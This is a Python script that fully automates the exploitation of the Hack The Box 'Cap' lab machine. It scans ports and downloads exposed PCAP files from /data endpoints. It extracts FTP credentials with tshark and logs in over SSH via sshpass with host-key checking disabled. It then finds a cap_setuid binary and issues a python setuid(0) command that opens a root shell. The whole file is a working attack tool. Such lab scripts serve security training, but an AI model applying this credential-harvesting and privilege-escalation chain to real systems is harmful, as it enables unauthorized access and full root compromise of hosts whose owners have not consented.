#!/usr/bin/env python3
import argparse
import logging
import subprocess
import os
import sys
import time
import urllib.request
import urllib.error
import shutil
import socket
from datetime import datetime
import tempfile

# ANSI color codes
YELLOW = "\033[33m"
CYAN = "\033[36m"
GREEN = "\033[32m"
MAGENTA = "\033[35m"
RESET = "\033[0m"

# ASCII art and summary
ascii_art = f"""
{YELLOW}
  ___              _                     _____              _         _         
 / _ \            | |                   /  ___|            (_)       | |        
/ /_\ \ _ __    __| |  ___   ____  ___  \ `--.   ___  _ __  _  _ __  | |_  ___  
|  _  || '_ \  / _` | / _ \ |_  / / _ \  `--. \ / __|| '__|| || '_ \ | __|/ __| 
| | | || | | || (_| || (_) | / / |  __/ /\__/ /| (__ | |   | || |_) || |_ \__ \ 
\_| |_/|_| |_| \__,_| \___/ /___| \___| \____/  \___||_|   |_|| .__/  \__||___/ 
                                                              | |               
                                                              |_|               
{RESET}
"""

summary = f"""
{CYAN}Welcome to the Cap Machine by HTB!
This script targets Cap, a Linux box at 10.10.10.245.
We'll scan ports, hunt PCAPs, crack FTP credentials,
exploit a cap_setuid binary, and land a root shell.
Let’s dive in and hack this box!{RESET}
"""

def setup_logging(verbose):
    """Configure logging with colored narrative messages."""
    level = logging.DEBUG if verbose else logging.INFO
    narrative_messages = [
        "Starting our journey by scanning ports",
        "Probing port 80 with curl",
        "Hunting PCAPs with curl",
        "Downloading PCAP",
        "Analyzing PCAP with tshark",
        "Testing SSH with sshpass",
        "Checking for privesc with getcap",
        "Preparing a root shell with sshpass",
        "Here’s what we found"
    ]
    class ColoredFormatter(logging.Formatter):
        def format(self, record):
            msg = record.msg
            is_narrative = any(msg.startswith(n) for n in narrative_messages)
            if record.levelname == 'INFO' and is_narrative:
                tool_map = {
                    'nmap': '\033[35mnmap\033[0m',
                    'socket': '\033[35msocket\033[0m',
                    'curl': '\033[35mcurl\033[0m',
                    'tshark': '\033[35mtshark\033[0m',
                    'sshpass': '\033[35msshpass\033[0m',
                    'getcap': '\033[35mgetcap\033[0m',
                    'python': '\033[35mpython\033[0m'
                }
                for tool, colored_tool in tool_map.items():
                    msg = msg.replace(tool, colored_tool)
                record.msg = f"\033[32m{msg}\033[0m"
            return super().format(record)
    handler = logging.StreamHandler()
    handler.setFormatter(ColoredFormatter(
        fmt='%(asctime)s [%(levelname)s] %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    ))
    logging.getLogger().handlers = [handler]
    logging.getLogger().setLevel(level)

def run_command(command, shell=False):
    """Execute a shell command and return output."""
    try:
        logging.debug(f"Executing command: {command}")
        result = subprocess.run(
            command, shell=shell, check=True, capture_output=True, text=True
        )
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.CalledProcessError as e:
        logging.debug(f"Command failed: {e.stderr}")
        return None, e.stderr

def check_dependencies():
    """Verify required tools are installed."""
    tools = ["curl", "tshark", "sshpass"]
    missing = []
    for tool in tools:
        if not shutil.which(tool):
            missing.append(tool)
    if missing:
        logging.error(f"Missing tools: {', '.join(missing)}")
        logging.info("Install with: sudo apt install curl wireshark-common sshpass")
        sys.exit(1)
    logging.info("All required tools are present.")

def check_port(ip, port, timeout=2):
    """Check if a port is open using socket."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    result = sock.connect_ex((ip, int(port)))
    sock.close()
    return result == 0

def scan_ports(ip):
    """Check common ports (21, 22, 80) for services."""
    logging.info("Starting our journey by scanning ports with socket...")
    common_ports = ["21", "22", "80"]
    open_ports = []
    for port in common_ports:
        if check_port(ip, port):
            logging.info(f"Port {port} is open")
            open_ports.append(port)
        else:
            logging.debug(f"Port {port} is closed")
    if not open_ports:
        logging.error("No open ports found")
        return []
    logging.info(f"Found open ports: {', '.join(open_ports)}")
    return open_ports

def check_web_service(ip, port):
    """Check for web services and enumerate PCAP endpoints."""
    if port != "80":
        logging.debug(f"Skipping port {port} as it’s unlikely to host a web service")
        return []
    logging.info(f"Probing port {port} with curl for a web service...")
    url = f"http://{ip}:{port}"
    try:
        with urllib.request.urlopen(url, timeout=5) as response:
            if response.getcode() == 200:
                logging.info(f"Web service found on port {port}")
                return enumerate_pcap_endpoints(ip, port)
    except urllib.error.URLError as e:
        logging.debug(f"Web service check failed on port {port}: {e}")
    return []

def enumerate_pcap_endpoints(ip, port):
    """Enumerate /data/ endpoints for PCAP files."""
    logging.info(f"Hunting PCAPs with curl on /data/ endpoints...")
    pcap_urls = []
    for i in range(10):
        url = f"http://{ip}:{port}/data/{i}"
        for attempt in range(1, 4):
            try:
                with urllib.request.urlopen(url, timeout=5) as response:
                    if response.getcode() == 200:
                        logging.info(f"Found PCAP endpoint: /data/{i}")
                        pcap_urls.append((i, f"http://{ip}:{port}/download/{i}"))
                        break
            except urllib.error.URLError as e:
                logging.debug(f"Attempt {attempt} failed for /data/{i}: {e}")
                if attempt == 3:
                    logging.info(f"No PCAP at /data/{i}")
                time.sleep(1)
    return pcap_urls

def download_pcap(url, index):
    """Download PCAP file to a temporary directory."""
    logging.info(f"Downloading PCAP {index} with curl...")
    temp_dir = tempfile.gettempdir()
    pcap_path = os.path.join(temp_dir, f"cap_{index}.pcap")
    try:
        urllib.request.urlretrieve(url, pcap_path)
        logging.info(f"PCAP saved to {pcap_path}")
        return pcap_path
    except urllib.error.URLError as e:
        logging.error(f"Failed to download PCAP: {e}")
        return None

def analyze_pcap(pcap_path):
    """Analyze PCAP file for FTP credentials using tshark."""
    logging.info(f"Analyzing PCAP with tshark for credentials...")
    tshark_cmd = [
        "tshark",
        "-r",
        pcap_path,
        "-Y",
        "ftp.request.command == USER || ftp.request.command == PASS",
        "-T",
        "fields",
        "-e",
        "ftp.request.arg",
    ]
    stdout, stderr = run_command(tshark_cmd)
    if not stdout:
        logging.error(f"PCAP analysis failed: {stderr}")
        return None, None
    username = None
    password = None
    for line in stdout.splitlines():
        if not username:
            username = line.strip()
        else:
            password = line.strip()
    if username and password:
        logging.info(f"Found credentials - Username: {username}, Password: {password}")
        return username, password
    logging.info("No FTP credentials found in PCAP")
    return None, None

def test_ssh_access(ip, username, password, retries=3, delay=2):
    """Test SSH access with found credentials, with retries."""
    logging.info(f"Testing SSH with sshpass for access...")
    ssh_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{ip} whoami"
    for attempt in range(1, retries + 1):
        stdout, stderr = run_command(ssh_cmd, shell=True)
        if stdout:
            logging.info(f"SSH access granted as {username}")
            return True
        logging.debug(f"SSH attempt {attempt} failed: {stderr}")
        if attempt < retries:
            logging.info(f"Retrying SSH connection ({attempt + 1}/{retries})...")
            time.sleep(delay)
    logging.error(f"SSH access failed after {retries} attempts")
    logging.info(f"Manual SSH command: ssh {username}@{ip}")
    logging.info(f"Password: {password}")
    return False

def check_capabilities(ip, username, password):
    """Check for binaries with cap_setuid capability."""
    logging.info(f"Checking for privesc with getcap...")
    getcap_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{ip} 'getcap -r / 2>/dev/null'"
    stdout, stderr = run_command(getcap_cmd, shell=True)
    if stdout:
        for line in stdout.splitlines():
            if "cap_setuid" in line:
                binary = line.split("=")[0].strip()
                logging.info(f"Found binary with cap_setuid: {binary}")
                return binary
    logging.info("No cap_setuid binaries found")
    return None

def provide_root_shell(ip, username, password, binary, auto_shell):
    """Provide a root shell to the user."""
    logging.info(f"Preparing a root shell with sshpass and python...")
    root_cmd = f"{binary} -c 'import os; os.setuid(0); os.system(\"\\\"/bin/sh\\\"\")'"
    full_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -t {username}@{ip} \"{root_cmd}\""
    if auto_shell:
        logging.info(f"Dropping into a root shell now...")
        try:
            os.system(full_cmd)
            logging.info("Exited root shell")
        except Exception as e:
            logging.error(f"Auto shell failed: {e}")
            logging.info(f"Please use the manual command:")
            logging.info(f"$ {full_cmd}")
    else:
        logging.info(f"Here’s your command for a root shell:")
        logging.info(f"$ {full_cmd}")
        logging.info("Run it to gain root access!")

def main():
    parser = argparse.ArgumentParser(description="Automate enumeration and exploitation for HTB Cap")
    parser.add_argument("--ip", default="10.10.10.245", help="Target IP address")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    parser.add_argument("--shell", action="store_true", help="Automatically drop into root shell")
    args = parser.parse_args()

    setup_logging(args.verbose)
    print(ascii_art)
    print(summary)
    check_dependencies()

    ports = scan_ports(args.ip)
    if not ports:
        logging.error("No open ports found. Exiting.")
        sys.exit(1)

    pcap_urls = []
    for port in ports:
        pcap_urls.extend(check_web_service(args.ip, port))
    if not pcap_urls:
        logging.error("No PCAP endpoints found. Exiting.")
        sys.exit(1)

    credentials = None
    for index, url in pcap_urls:
        pcap_path = download_pcap(url, index)
        if pcap_path:
            username, password = analyze_pcap(pcap_path)
            if username and password:
                credentials = (username, password)
                break

    if not credentials:
        logging.error("No valid credentials found. Exiting.")
        sys.exit(1)
    username, password = credentials

    if not test_ssh_access(args.ip, username, password):
        logging.error("Credentials invalid. Exiting.")
        sys.exit(1)

    binary = check_capabilities(args.ip, username, password)
    if not binary:
        logging.error("No exploitable binaries found. Exiting.")
        sys.exit(1)

    provide_root_shell(args.ip, username, password, binary, args.shell)

    logging.info(f"{GREEN}Here’s what we found on our journey through Cap...{RESET}")
    logging.info("Summary:")
    logging.info(f"Open ports: {', '.join(ports)}")
    if credentials:
        logging.info(f"Credentials: {username}/{password}")
    if binary:
        logging.info(f"Privesc binary: {binary} (cap_setuid)")
    logging.info("To gain root access, run:")
    logging.info(f"$ sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -t {username}@{args.ip} \"{binary} -c 'import os; os.setuid(0); os.system(\\\"bash || sh\\\")'\"")
    logging.info("Explore /root for flags!")

if __name__ == "__main__":
    main()
